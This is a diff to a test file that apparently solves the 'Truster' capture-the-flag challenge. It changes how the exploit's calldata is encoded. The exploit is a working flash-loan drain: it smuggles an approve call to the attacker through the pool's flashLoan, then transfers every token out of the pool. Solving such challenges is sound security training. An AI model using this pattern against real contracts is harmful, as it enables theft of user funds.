@@ -24,9 +24,12 @@ describe('[Challenge] Truster', function () {
   });
 
   it('Exploit', async function () {
-    let abi = ['function approve(address spender,uint256 amount)'];
-    let iface = new ethers.utils.Interface(abi);
-    let data = iface.encodeFunctionData('approve', [attacker.address, TOKENS_IN_POOL]);
+    // let abi = ['function approve(address spender,uint256 amount)'];
+    // let iface = new ethers.utils.Interface(abi);
+    // let data = iface.encodeFunctionData('approve', [attacker.address, TOKENS_IN_POOL]);
+    const data = await (
+      await ethers.getContractFactory('DamnValuableToken')
+    ).interface.encodeFunctionData('approve', [attacker.address, TOKENS_IN_POOL]);
     await this.pool.flashLoan(0, attacker.address, this.token.address, data);
     await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
     /** CODE YOUR EXPLOIT HERE  */
